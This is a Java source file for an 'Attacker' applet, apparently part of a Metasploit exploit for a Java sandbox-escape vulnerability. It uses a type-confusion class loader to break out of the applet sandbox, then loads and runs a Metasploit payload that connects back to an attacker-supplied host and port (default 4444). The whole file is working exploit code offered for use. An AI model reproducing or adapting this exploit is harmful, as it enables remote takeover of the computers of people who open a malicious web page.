package cve1723;

import java.applet.Applet;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.IntBuffer;

/**
 * Attacker applet
 */
public class Attacker extends Applet {
	@Override
	public void init() {
		super.init();

		final Confuser c = new Confuser();
		for (int i = 0; i < 100000; i++) {
			c.confuse(null);
		}

		try {
			Thread.sleep(100);
		} catch (final InterruptedException ie) {
			//swallow
		}

		try {
			final ConfusingClassLoader cl = c.confuse(getClass().getClassLoader());
			final String names[] = { "msf.x.PayloadX", "msf.x.PayloadX$StreamConnector" };
			final String paths[] = { "/msf/x/PayloadX.class", "/msf/x/PayloadX$StreamConnector.class" };

			final String port = getParameter("lport");
			ConfusingClassLoader.defineAndCreate(cl, names, new byte[][] { loadClass(paths[0]), loadClass(paths[1])}, getParameter("data"), getParameter("jar"), getParameter("lhost"), (port == null ? 4444 : Integer.parseInt(port)));
		} catch (final Exception e) {
			e.printStackTrace();
		}
	}

	private byte[] loadClass(final String name) throws IOException {
		final ByteArrayOutputStream os = new ByteArrayOutputStream();
		{ // load the payload class
			final InputStream is = getClass().getResourceAsStream(name);
			int read;
			byte[] buffer = new byte[2048];

			while ((read = is.read(buffer, 0, buffer.length)) != -1) {
				os.write(buffer, 0, read);
			}
		}

		return os.toByteArray();
	}

	@Override
	public void paint(final Graphics g) {
		super.paint(g);

		final String tool = System.getSecurityManager() == null ? "null" : System.getSecurityManager().toString();
		g.drawString(tool, 0, 10);
	}
}
